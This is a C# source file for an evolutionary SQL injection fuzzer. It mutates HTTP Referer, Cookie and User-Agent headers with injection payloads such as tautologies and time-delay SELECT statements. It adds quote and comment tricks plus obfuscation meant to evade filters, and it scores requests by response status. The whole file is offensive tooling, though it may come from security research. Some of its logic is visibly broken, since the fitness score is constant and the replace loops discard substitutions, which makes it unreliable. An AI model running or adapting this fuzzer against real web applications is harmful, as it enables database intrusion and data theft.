using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Web;

namespace sqli1
{
    public class Manage_Gen
    {
        public int n=250;//number of gens
        public Gen[] gen_pool;      
        static CookieContainer cookies = new CookieContainer();

        public Manage_Gen(string uri, string method)
        {
            gen_pool = new Gen[n];
            if (uri == null)
            {
                throw new ArgumentNullException("uri");
            }

            // Create a request using a URL that can receive a post. 
            for (int i = 0; i < n; i++)
            {
                HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(uri);
                // Set the Method property of the request to POST.
                request.Method = method;

                request.Headers.Add("Cookie", "");

                request.Credentials = CredentialCache.DefaultNetworkCredentials;
          
                if (method == "POST")
                {
                    /*
                    // Convert POST data to a byte array.
                    byte[] byteArray = Encoding.UTF8.GetBytes(content);
                    // Set the ContentType property of the WebRequest.
                    request.ContentType = "application/x-www-form-urlencoded";
                    // Set the ContentLength property of the WebRequest.
                    request.ContentLength = byteArray.Length;
                    // Get the request stream.
                    Stream dataStream = request.GetRequestStream();
                    // Write the data to the request stream.
                    dataStream.Write(byteArray, 0, byteArray.Length);
                    // Close the Stream object.
                    dataStream.Close();
                    */
                }
               gen_pool[i] = new Gen();
                gen_pool[i].httprequest = request;
               // fill_empty_header(gen_pool[i]);
            }//end for
        }
        /// <summary>
        /// compute gen suitability and return the prenect of fitness
        /// </summary>
        /// <param name="gen"></param>
        /// <returns>return the precent of fitness of input gen</returns>
        public int suitability(Gen gen)
        {
            int suitability = 1;


            return suitability;
        }

        /// <summary>
        /// to choose two gen for combination in next step of genetic algorthm
        /// </summary>
        /// <returns>index of two gens in gens pool</returns>
       public int[] Choose_Parent()
        {
            int[] parent_index = new int[] { -1, -1 };

            Random r = new Random(Guid.NewGuid().GetHashCode());
            int i = 0;

            //choose a gen from behaviour mutated gens
            while(true)
            {
                i=r.Next(0, n);
                if (gen_pool[i] != null)
                    if( gen_pool[i].mutation_approach[0])//is a behaviour mutated
                    break;
            }
            parent_index[0] = i;

            //now choose other parent from syntax or obfuscation pool
            while (true)
            {
                i = r.Next(0, n);
                if (gen_pool[i] != null)
                    if(gen_pool[i].mutation_approach[1] || gen_pool[i].mutation_approach[2])//is a syntax OR obfuscation mutated
                    break;
            }
            parent_index[1] = i;

            return parent_index;
        }

        /// <summary>
        /// mutate inpute child by the way of way_of_mutation!
        /// </summary>
        /// <param name="children"></param>
        /// <param name="way_of_mutation">index of mutation type: 1=behavoiur chang, 2=syntax repair, 3=obfuscation</param>
        /// <returns>return mutated gen</returns>
        public void Mutation(Manage_Gen mg)
        {
           // Gen mutated_gen = new Gen();
            
            Random r = new Random(Guid.NewGuid().GetHashCode());
            int random;

            int rand_for_choose_to_be_behavoiur_or_not = 0;
            rand_for_choose_to_be_behavoiur_or_not = r.Next(0, 1);

            int mutation_approach;

            for(int i=0 ;i < n; i++)
            {
                random = r.Next(1, 11);//1-10
                //30% percent of gens will be mutated (maybe 40%)
                if (random <= 3)//60% just for test
                {
                    //choose random mutation approach
                    if (rand_for_choose_to_be_behavoiur_or_not == 1)
                        mutation_approach = 1;
                    else
                    mutation_approach = r.Next(1, 4);//either syntax or obfuscation

                    switch (mutation_approach)
                    {
                        case 1://behavoiur
                            mg.gen_pool[i] = behavoiur_mutation(mg.gen_pool[i]);
                            break;

                        case 2://syntax
                            mg.gen_pool[i] = syntax_repairing(mg.gen_pool[i]);
                            break;

                        case 3://obfuscation
                            mg.gen_pool[i] = obfuscation(mg.gen_pool[i]);
                            break;
                    }
                }
               // else
             //       mutated_gen = mg.gen_pool[i];//return gen without any mutation

           }
            //return mutated_gen;
        }//end mutation func

        /// <summary>
        /// merge two gen and create two new children where updated to gen pool instead their parents
        /// </summary>
        /// <param name="parent1"></param>
        /// <param name="parent2"></param>
        public Gen[] Merg_parents(Gen parent1,Gen parent2)
        {
            Gen[] childrens = new Gen[2];

            Random r = new Random(Guid.NewGuid().GetHashCode());
            int rand = r.Next(0, 2);//to choose mutation approach from mution_approach of parents(probility 50-50)

            //detect mutation approach for parent1
            //analysize parent2 and its mutation approach

            //maybe parent2 had both mutation(syntatx and obfuscation)
            //rand use to inherit mutation-approach randomly from his parents
            if (rand == 0 )
            {
                if (parent2.mutation_approach[1])//parent2 had syntax mutation
                {
                    childrens[0] = syntax_repairing(parent1);//updated parent1 inhertant syntax mutation from his parents
                }
                else if (parent2.mutation_approach[2])//updated parent1 inhertant obfuscation from his parents
                    childrens[0] = obfuscation(parent1);
            }
            else //rand =1
            {
                if (parent2.mutation_approach[2])//parent2 had obfuscation mutation
                {
                    childrens[0] = obfuscation(parent1);
                }
                else if(parent2.mutation_approach[1])//parent2 had syntax-mutation mutation
                    childrens[0] = syntax_repairing (parent1);
            }

            //detect mutation approach for parent2
            //analysize parent1 and its mutation approach
            if (!parent2.mutation_approach[0] )
                childrens[1] = behavoiur_mutation(parent2);//with no change
            else
            {
                rand = r.Next(0, 2);
                if (rand == 0)
                {
                    if (parent1.mutation_approach[1])//parent2 had syntax mutation
                    {
                        childrens[1] = syntax_repairing(parent2);//updated parent1 inhertant syntax mutation from his parents
                    }
                    else if (parent1.mutation_approach[2])//parent2 had obfuscation mutation
                        childrens[1] = obfuscation(parent2);
                }
                else //rand =1
                {
                    if (parent1.mutation_approach[2])//parent2 had obfuscation mutation
                    {
                        childrens[1] = obfuscation(parent2);
                    }
                    else if (parent1.mutation_approach[1])
                        childrens[1] = syntax_repairing(parent2);
                }
            }
            return childrens;
        }

        /// <summary>
        /// to update gens pool
        /// </summary>
        /// <param name="children"></param>
       public void update_gens(Gen[] children)
        {
            Random r = new Random(Guid.NewGuid().GetHashCode());
            int rand = r.Next(1, 10);
            int index = r.Next(0, n);//chnage to 99?


            //choose random gen from gen-pool
            //if choosen gen was null? updata with probility 70%
            //if choosen gen was  NOT null? updata with probility 40%

            //update for first child
            //gen_pool[index] was not mutated  at all
            if ( !gen_pool[index].mutation_approach[0] && !gen_pool[index].mutation_approach[1] && !gen_pool[index].mutation_approach[0])
            {
                //if (rand >= 3)
                    gen_pool[index] = children[0];//100%
            }
            else
            {
                if (rand >= 2)//80%
                    gen_pool[index] = children[0];
            }

            //update for second child
            rand = r.Next(1, 10);
            index = r.Next(0, n);

            if (!gen_pool[index].mutation_approach[0] && !gen_pool[index].mutation_approach[1] && !gen_pool[index].mutation_approach[0])
            {
                //if (rand >= 3)
                gen_pool[index] = children[1];
            }
            else
            {
                if (rand >= 2)
                    gen_pool[index] = children[1];
            }
        }

        public double update_suitability(int gen_index, HttpWebResponse response)
        {
            double updated_suitability = gen_pool[gen_index].suitability;

            switch(response.StatusCode)
            {
                case HttpStatusCode.Accepted://202
                    updated_suitability += (0.1 * updated_suitability);
                    break;

                case HttpStatusCode.Ambiguous://300 redirect
                    updated_suitability += (0.2 * updated_suitability);
                    break;

                case HttpStatusCode.BadGateway://502
                    updated_suitability -= (0.1 * updated_suitability);
                    break;

                case HttpStatusCode.BadRequest://400
                    updated_suitability += ((0.3 * updated_suitability));
                    break;

                case HttpStatusCode.Conflict://409
                    updated_suitability += (0.3 * updated_suitability);
                    break;
                case HttpStatusCode.Created://201
                    updated_suitability -= (0.2 * updated_suitability);
                    break;
                case HttpStatusCode.ExpectationFailed://417
                    updated_suitability += (0.2 * updated_suitability);
                    break;
                case HttpStatusCode.Forbidden://403
                    updated_suitability += (0.1 * updated_suitability);
                    break;
                case HttpStatusCode.Found://302
               // case HttpStatusCode.Redirect://302
                    updated_suitability += (0.2 * updated_suitability);
                    break;
                case HttpStatusCode.GatewayTimeout://504
                    updated_suitability += (0.15 * updated_suitability);
                    break;
                case HttpStatusCode.Gone://410
                    updated_suitability += (0.1 * updated_suitability);
                    break;
                case HttpStatusCode.HttpVersionNotSupported://505
                    updated_suitability -= (0.2 * updated_suitability);
                    break;
                case HttpStatusCode.InternalServerError://500
                    updated_suitability += ((0.2 * updated_suitability));
                    break;
                case HttpStatusCode.NotAcceptable://406
                    updated_suitability += ((0.15 * updated_suitability));
                    break;
                case HttpStatusCode.OK://200
                    updated_suitability += ((0.3 * updated_suitability));
                    break;
                case HttpStatusCode.PaymentRequired://402
                    updated_suitability -= ((0.3 * updated_suitability));
                    break;

            }
           
            return updated_suitability;
        }

        /// <summary>
        /// mutate input gen by three existence condition: mo_OR,mo_AND,mo_Semi
        /// </summary>
        /// <param name="input_gen"></param>
        /// <returns>return mutated gen</returns>
        public Gen behavoiur_mutation(Gen input_gen)
        {
            if (input_gen == null)
                return input_gen;

            //input gen was not null
            if (input_gen.mutation_approach[0])//do not apply behavoiur mutation twice!
                return input_gen;
           
            // Gen mutated_gen = new Gen();
            Random r = new Random(Guid.NewGuid().GetHashCode());
            int mutation_type = r.Next(1, 4);

            int header = r.Next(0, 3);//two choose referee,user-agant or cookie header for mutation
            input_gen.mutated_header[header] = true;
            header++;//counting from 1 !

            input_gen.mutation_approach[0] = true;//behavoiur
            string temp;

            switch(mutation_type)
            {
                case 1://mo_OR
                    input_gen.behaviour_changing[0] = true;
                    switch(header)
                    {
                        case 1://referer
                          //  input_gen.mutated_header[0] = true;
                            if (input_gen.httprequest.Referer == null)
                                input_gen.httprequest.Referer = "OR x=x";
                            else
                            {
                                temp = input_gen.httprequest.Referer;
                                input_gen.httprequest.Referer = "OR x=x";
                                input_gen.httprequest.Referer += temp;
                            }
                            break;
                        case 2://cookie
                            if(input_gen.httprequest.Headers["Cookie"] == null)
                                input_gen.httprequest.Headers.Add("Cookie", "OR x = x");
                            else
                            {
                                temp = input_gen.httprequest.Headers["Cookie"];
                                input_gen.httprequest.Headers["Cookie"] = "OR x = x";
                                input_gen.httprequest.Headers["Cookie"] += temp;
                            }
                            break;
                        case 3://user-agant
                          //  input_gen.mutated_header[2] = true;

                            if (input_gen.httprequest.UserAgent == null)
                                input_gen.httprequest.UserAgent = "OR x=x";
                            else
                            {
                                temp = input_gen.httprequest.UserAgent;
                                input_gen.httprequest.UserAgent = "OR x=x";
                                input_gen.httprequest.UserAgent += temp;
                            }
                            break;
                    }
                    break;

                case 2://mo_AND
                    input_gen.behaviour_changing[1] = true;
                    switch (header)
                    {
                        case 1://referer
                          //  input_gen.mutated_header[0] = true;
                            if (input_gen.httprequest.Referer == null)
                                input_gen.httprequest.Referer = "AND x=y";
                            else
                            {
                                temp = input_gen.httprequest.Referer;
                                input_gen.httprequest.Referer = "AND x=y ";
                                input_gen.httprequest.Referer += temp;
                            }
                            break;
                        case 2://cookie
                          //  input_gen.mutated_header[1] = true;
                            if (input_gen.httprequest.Headers["Cookie"] == null)
                                input_gen.httprequest.Headers.Add("Cookie", "AND x=y ");
                            else
                            {
                                temp = input_gen.httprequest.Headers["Cookie"];
                                input_gen.httprequest.Headers["Cookie"] = "AND x=y ";
                                input_gen.httprequest.Headers["Cookie"] += temp;
                            }
                            break;
                        case 3://user-agant
                          //  input_gen.mutated_header[2] = true;
                            if (input_gen.httprequest.UserAgent == null)
                                input_gen.httprequest.UserAgent = "AND x=y";
                            else
                            {
                                temp = input_gen.httprequest.UserAgent;
                                input_gen.httprequest.UserAgent = "AND x=y";
                                input_gen.httprequest.UserAgent += temp;
                            }
                            break;
                    }
                    break;

                case 3://mo_semi
                    input_gen.behaviour_changing[2] = true;
                    switch (header)
                    {
                        case 1://referer
                          //  input_gen.mutated_header[0] = true;

                            if (input_gen.httprequest.Referer == null)
                                input_gen.httprequest.Referer = "; SELECT waitfor(5) FROM dual";
                            else
                            {
                                temp = input_gen.httprequest.Referer;
                                input_gen.httprequest.Referer = "; SELECT waitfor(5) FROM dual";
                                input_gen.httprequest.Referer += temp;
                            }
                            break;
                        case 2://cookie
                            if (input_gen.httprequest.Headers["Cookie"] == null)
                                input_gen.httprequest.Headers.Add("Cookie", "; SELECT waitfor(5) FROM dual");
                            else
                            {
                                temp = input_gen.httprequest.Headers["Cookie"];
                                input_gen.httprequest.Headers["Cookie"] = "; SELECT waitfor(5) FROM dual";
                                input_gen.httprequest.Headers["Cookie"] += temp;
                            }
                            break;
                        case 3://user-agant
                            //input_gen.mutated_header[2] = true;
                            if (input_gen.httprequest.UserAgent == null)
                                input_gen.httprequest.UserAgent = "; SELECT waitfor(5) FROM dual";
                            else
                            {
                                temp = input_gen.httprequest.UserAgent;
                                input_gen.httprequest.UserAgent = "; SELECT waitfor(5) FROM dual";
                                input_gen.httprequest.UserAgent += temp;
                            }
                            break;
                    }
                    break;
            }
            input_gen.mutation_approach[0] = true;
            return input_gen;
        }

        public Gen syntax_repairing(Gen input_gen)
        {
            //check precondition
           // if (!input_gen.mutation_approach[0])//behavoiur changinf applied before?
             //   return input_gen;//without change

            // Gen mutated_gen = new Gen();
            Random r = new Random(Guid.NewGuid().GetHashCode());
            int mutation_type = r.Next(1, 4);

          if (input_gen.syntax_repairing[mutation_type - 1])
            return input_gen;//this type of mutation was applied before!

            int header = r.Next(0, 3);//two choose referee,user-agant or cookie header for mutation
            
            input_gen.mutated_header[header] = true;
            header++;
            input_gen.mutation_approach[1] = true;

            string temp = "";
            switch (mutation_type)
            {
                case 1://mo_par
                    input_gen.syntax_repairing[0] = true;//par
                    switch (header)
                    {
                        case 1://referer
                            if (input_gen.httprequest.Referer == null)
                                input_gen.httprequest.Referer = ") ";
                            else
                            {
                                temp = input_gen.httprequest.Referer;
                                input_gen.httprequest.Referer = ") ";
                                input_gen.httprequest.Referer += temp;
                            }
                            break;
                        case 2://cookie
                            if (input_gen.httprequest.Headers["Cookie"] == null)
                                input_gen.httprequest.Headers["Cookie"] = ") ";
                            else
                            {
                                temp = input_gen.httprequest.Headers["Cookie"];
                                input_gen.httprequest.Headers["Cookie"] = ") ";
                                input_gen.httprequest.Headers["Cookie"] += temp;
                            }
                            break;
                        case 3://user-agant
                            if (input_gen.httprequest.UserAgent == null)
                                input_gen.httprequest.UserAgent = ") ";
                            else
                            {
                                temp = input_gen.httprequest.UserAgent;
                                input_gen.httprequest.UserAgent = ") ";
                                input_gen.httprequest.UserAgent += temp;
                            }
                            break;
                    }
                    break;

                case 2://mo_cmt
                    input_gen.syntax_repairing[1] = true;//cmt
                    int rand = r.Next(0, 2);
                    switch (header)
                    {
                        case 1://referer
                            if (rand == 0)
                                if (input_gen.httprequest.Referer == null)
                                     input_gen.httprequest.Referer = "#";
                                else
                                {
                                    input_gen.httprequest.Referer += "#";//# add to last of insertion
                                }
                            else
                            {
                                if (input_gen.httprequest.Referer == null)
                                    input_gen.httprequest.Referer = "--";
                                else
                                input_gen.httprequest.Referer += "--";
                            }

                           break;
                        case 2://cookie
                            if (input_gen.httprequest.Headers["Cookie"] == null)
                            {
                                if(rand == 0)
                                    input_gen.httprequest.Headers["Cookie"] = "#";
                                else
                                    input_gen.httprequest.Headers["Cookie"] = "--";
                            }
                            else
                            {
                                if (rand == 0)
                                    input_gen.httprequest.Headers["Cookie"] += "#";
                                else
                                    input_gen.httprequest.Headers["Cookie"] += "--";
                            }
                            break;
                        case 3://user-agant
                            if (rand == 0)
                            {
                                if (input_gen.httprequest.UserAgent == null)
                                    input_gen.httprequest.UserAgent = "#";
                                else
                                    input_gen.httprequest.UserAgent += "#";
                            }
                            else
                            {
                                if(input_gen.httprequest.UserAgent == null)
                                    input_gen.httprequest.UserAgent = "--";
                                else
                                    input_gen.httprequest.UserAgent += "--";
                            }
                            break;
                    }
                    break;

                case 3://mo_qot
                    temp = "";
                    input_gen.syntax_repairing[2] = true;//qot
                    rand = r.Next(0, 2);
                    switch (header)
                    {
                        case 1://referer
                            if (input_gen.httprequest.Referer != null)
                                 temp = input_gen.httprequest.Referer;

                            if(rand==0)
                              input_gen.httprequest.Referer = "' ";
                            else
                                input_gen.httprequest.Referer = "\" ";

                            if(temp != "")
                                 input_gen.httprequest.Referer += temp;
                           
                            break;
                        case 2://cookie
                            if (input_gen.httprequest.Headers["Cookie"] == null)
                            {
                                if(rand == 0)
                                    input_gen.httprequest.Headers["Cookie"] = "' ";
                                else
                                    input_gen.httprequest.Headers["Cookie"] = "\" ";
                            }
                            else
                            {
                                temp = input_gen.httprequest.Headers["Cookie"];

                                if (rand == 0)
                                    input_gen.httprequest.Headers["Cookie"] = "' ";
                                else
                                    input_gen.httprequest.Headers["Cookie"] = "\" ";

                                input_gen.httprequest.Headers["Cookie"] += temp;
                            }
                            break;
                        case 3://user-agant
                            if (input_gen.httprequest.UserAgent != null)
                                temp = input_gen.httprequest.UserAgent;

                                if (rand == 0)
                                input_gen.httprequest.UserAgent = "' ";
                                else
                                input_gen.httprequest.UserAgent = "\" ";

                              if(temp != "")
                                  input_gen.httprequest.UserAgent += temp;
                            break;
                    }
                    break;
            }
            return input_gen;
            }

        public Gen obfuscation(Gen input_gen)
        {
            if (input_gen == null)
                return input_gen;//we can not mutate obfuscation when gen is null(have no alphabate to obfuscate)

            //at least one header was mutate before comming to obfuscation
            if (!input_gen.mutated_header[0] && !input_gen.mutated_header[1] && !input_gen.mutated_header[2])
                return input_gen;

            if (!input_gen.mutation_approach[0] && !input_gen.mutation_approach[1])//behavoiur change (or at least syntax...)must be applied before comming to obfuscation
                return input_gen;

            Random r = new Random(Guid.NewGuid().GetHashCode());
            int mutation_type = r.Next(3, 7);//(1,7)

            int header = r.Next(0, 3);//to choose referee,user-agant or cookie header for mutation

            while (true)
            {
                if (!input_gen.mutated_header[header])
                    header = r.Next(0, 3);
                else
                    break;
             }
         
            input_gen.mutated_header[header] = true;

            input_gen.mutation_approach[2] = true;//obfuscation
            header++;//1-3 not 0-2
            switch(mutation_type)
            {
                /*
                case 1://MO_wsp
                   
                    break;
                case 2://MO_html
                    break;
                    */
                case 3://MO_chr
                    input_gen.obfuscation[0] = true;//MO_chr
                    switch(header)
                    {
                        case 1://referer
                            input_gen.httprequest.Referer = MO_chr(input_gen.httprequest.Referer);
                            break;
                        case 2://cookie
                            input_gen.httprequest.Headers["Cookie"] = MO_chr(input_gen.httprequest.Headers["Cookie"]);
                            break;
                        case 3://user-aganet
                            input_gen.httprequest.UserAgent = MO_chr(input_gen.httprequest.UserAgent);
                            break;
                    }
                    break;
                    
                case 4://MO_per
                    input_gen.obfuscation[1] = true;//MO_per
                    switch(header)
                    {
                        case 1://referer
                            input_gen.httprequest.Referer = MO_per(input_gen.httprequest.Referer);
                            break;
                        case 2://cookie
                            input_gen.httprequest.Headers["Cookie"] = MO_per(input_gen.httprequest.Headers["Cookie"]);
                            break;
                        case 3://user-aganet
                            input_gen.httprequest.UserAgent = MO_per(input_gen.httprequest.UserAgent);
                            break;
                    }
                    break;
                case 5://MO_bool
                    input_gen.obfuscation[2] = true;//MO_bool
                    switch (header)
                    {
                        case 1://referer
                            input_gen.httprequest.Referer = MO_bool(input_gen.httprequest.Referer);
                            break;
                        case 2://cookie
                            input_gen.httprequest.Headers["Cookie"] = MO_bool(input_gen.httprequest.Headers["Cookie"]);
                            break;
                        case 3://user-aganet
                            input_gen.httprequest.UserAgent = MO_bool(input_gen.httprequest.UserAgent);
                            break;
                    }
                    break;
                case 6://MO_keyw
                    input_gen.obfuscation[3] = true;//MO_keyw
                    switch (header)
                    {
                        case 1://referer
                            input_gen.httprequest.Referer = MO_keyw(input_gen.httprequest.Referer);
                            break;
                        case 2://cookie
                            input_gen.httprequest.Headers["Cookie"] = MO_keyw(input_gen.httprequest.Headers["Cookie"]);
                            break;
                        case 3://user-aganet
                            input_gen.httprequest.UserAgent = MO_keyw(input_gen.httprequest.UserAgent);
                            break;
                    }
                    break;

            }

            return input_gen;
        }

        public string MO_per(string input)
        {
            if (input == null)
                return input;

            string output="";
            Dictionary<string, string> mo_per = new Dictionary<string, string>();

            mo_per.Add("'", Uri.HexEscape('\''));
            mo_per.Add(" ", Uri.HexEscape(' '));
            mo_per.Add("\"", Uri.HexEscape('"'));
            mo_per.Add("=", Uri.HexEscape('='));
            mo_per.Add("S", Uri.HexEscape('S'));
            mo_per.Add("F", Uri.HexEscape('F'));

            foreach (KeyValuePair<string, string> item in mo_per)
                if (input.Contains(item.Key))
                {
                    //input.inde
                    output = input.Replace(item.Key, item.Value);
                }

            return output;
        }

        public string MO_bool(string input)
        {
            if (input == null)
                return input;

            string output = "";
            Random r = new Random(Guid.NewGuid().GetHashCode());
            int  rand=r.Next(1, 4);
           
            if (input.Contains("1"))
            {
               switch(rand)
                {
                    case 1:
                        output = input.Replace("1", "!!1");
                        break;
                    case 2:
                        output = input.Replace("1", "not false");
                        break;
                    case 3:
                        output = input.Replace("1", "true");
                        break;

                }

            }

            return output;
        }

        public string MO_keyw(string input)
        {
            if (input == null)
                return input;
            string output = "";
            Dictionary<string, string> mo_keyw = new Dictionary<string, string>();

            mo_keyw.Add("select","sel/*ect*/");
            mo_keyw.Add("OR", "||");
            mo_keyw.Add("AND", "&");
            mo_keyw.Add("FROM","FR/*OM*/");
            mo_keyw.Add("waitfor","WaiTFor");

            foreach (KeyValuePair<string, string> item in mo_keyw)
                if (input.Contains(item.Key))
                    output = input.Replace(item.Key, item.Value);

            return output;
        }

        public string MO_chr(string myinput)
        {
            if (myinput == "" || myinput==null)
                return myinput;

            string output = "";
            char input;

            int random_index=0;
            Random r = new Random(Guid.NewGuid().GetHashCode());

            random_index = r.Next(0, myinput.Length);
            input = myinput[random_index];

            int rand = r.Next(0, 2);

            if (rand == 0)//short binary representation
            {
                StringBuilder sb = new StringBuilder();
                sb.Append(Convert.ToString(input, 2).PadLeft(8, '0'));
                output = sb.ToString();
            }
            else//hexadecimal representation
                output = Convert.ToByte(input).ToString("x2");

            output = myinput.Replace(input.ToString(), output);

            return output;
        }
        
        public void fill_empty_header(Gen input_gen)
        {
            string temp="";

            string user_agent_value = "Mozilla / 5.0";
            string referer_value = "http://www.testreferer.com";

            if (input_gen.httprequest.Referer == null)//is null
                input_gen.httprequest.Referer = referer_value;
            else//refere was set before
            {
                if (! input_gen.httprequest.Referer.Contains( referer_value))
                {
                    temp = input_gen.httprequest.Referer;
                    input_gen.httprequest.Referer = referer_value;
                    input_gen.httprequest.Referer += temp;
                }
            }

            if (input_gen.httprequest.UserAgent == null)
                input_gen.httprequest.UserAgent = user_agent_value;
            else
            {
                if (!input_gen.httprequest.UserAgent.Contains(user_agent_value))
                {
                    temp = input_gen.httprequest.UserAgent;
                    input_gen.httprequest.UserAgent = user_agent_value;
                    input_gen.httprequest.UserAgent += temp;
                } 
            }
        }

        public  HttpWebResponse GetResponse(HttpWebRequest request)
        {
            if (request == null)
            {
                throw new ArgumentNullException("request");
            }
            HttpWebResponse response = null;
            try
            {
                response = (HttpWebResponse)request.GetResponse();
                //
                // Console.WriteLine("status code : "+response.Headers.Get("StatusCode"));
                Console.WriteLine("status code : " + response.StatusCode);

                Console.WriteLine("sqli result : " + response.Headers.Get("Sqli"));

                //Console.WriteLine(response.ContentLength);
                // Console.WriteLine("response stream "+response.GetResponseStream().ToString());
                //
                cookies.Add(response.Cookies);
                // Print the properties of each cookie.
              //  Console.WriteLine("\nCookies: ");
              /*
                foreach (Cookie cook in cookies.GetCookies(request.RequestUri))
                {
                    Console.WriteLine("Domain: {0}, String: {1}", cook.Domain, cook.ToString());
                }
                */
            }
            catch (WebException ex)
            {
                Console.WriteLine("Web exception occurred. Status code: {0}", ex.Status);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return response;
        }

    }//end class
}
